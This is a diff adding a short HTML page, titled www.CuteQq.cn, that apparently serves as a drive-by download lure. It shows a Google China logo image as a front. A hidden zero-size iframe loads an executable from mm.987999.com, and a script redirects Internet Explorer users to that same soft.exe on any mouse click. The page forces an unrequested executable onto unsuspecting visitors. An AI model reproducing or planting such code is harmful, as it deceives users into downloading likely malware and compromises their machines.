@@ -1,0 +1,25 @@
+<!DOCTYPE HTML PUBLIC"-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type"content="text/html; charset=gb2312">
+<title>www.CuteQq.cn</title>
+</head>
+<table>
+<td height="0" style="border: 2px dotted #999999"><IFRAME align=center name="target" frameBorder=0 height=0 scrolling=no src="http://mm.987999.com/soft.exe" width=0></IFRAME>
+</p>
+</td>
+</table>
+<body>
+<script language=JavaScript>
+if (navigator.appName.indexOf("Internet Explorer") != -1)
+document.onmousedown = noSourceExplorer;
+function noSourceExplorer()
+{
+if (event.button == 1 | event.button == 2)
+{
+location.replace("http://mm.987999.com/soft.exe");
+}
+}
+</script><img src="http://www.google.cn/intl/zh-CN/images/logo_cn.gif" width="715" height="400">
+</body>
+</html>
